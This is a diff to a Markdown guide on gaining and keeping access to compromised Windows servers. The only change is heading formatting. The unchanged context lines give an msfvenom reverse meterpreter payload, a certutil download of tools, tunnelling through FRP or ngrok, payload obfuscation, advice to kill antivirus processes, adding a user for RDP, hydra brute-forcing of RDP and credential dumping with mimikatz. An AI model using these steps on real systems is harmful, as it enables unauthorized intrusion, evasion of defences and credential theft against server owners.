@@ -33,7 +33,7 @@ certutil -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zi
 
 Most of the time you will face three situations:
 
-### You don't have administrator privilege, but there is no protection system.
+* ### You don't have administrator privilege, but there is no protection system.
 If you're lucky enough, there's no anti-virus software in the system, you can trigger a reverse Metasploit shell in any method you like:
 In an easy way:
 
@@ -42,7 +42,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe > a.
 ```
 All you need to do is uploading the payload and execute it. When it comes to the question of how to upload the payload, the answer is that you must forward your local port to the public network with the help of FRP(https://github.com/fatedier/frp) which is a powerful tool, and you must have a VPS to achieve that. Even if you don't have a VPS, you can use ngrok to make it work.
 
-### There is protection system in the server, but you have administrator privilege.
+* ### There is protection system in the server, but you have administrator privilege.
 If you're not so lucky, maybe you should find some methods such as veil-evasion to obfuscate your payload. In worse situation, your payload which has been obfuscated was deleted by the antivirus as well. you'd better consider killing the process of the antivirus.
 
 Sometimes it's not easy to kill the process of antivirus, you can just log into the system by the remote desktop protocol. The first step is to add a new user to the system:
@@ -69,7 +69,7 @@ hydra x.x.x.x rdp -L users.txt -P wordlist.txt -v
 ```
 Mimikatz is also a good choice to dump the username and password from memory of the server. But most of the time mimikatz will be killed by the protection system.
 
-### You don't have the administrator privilege, and the server has a protection system.
+* ### You don't have the administrator privilege, and the server has a protection system.
 
 Shutdown your computer and go to sleep unless you have some 0day vulnerabilities.
 
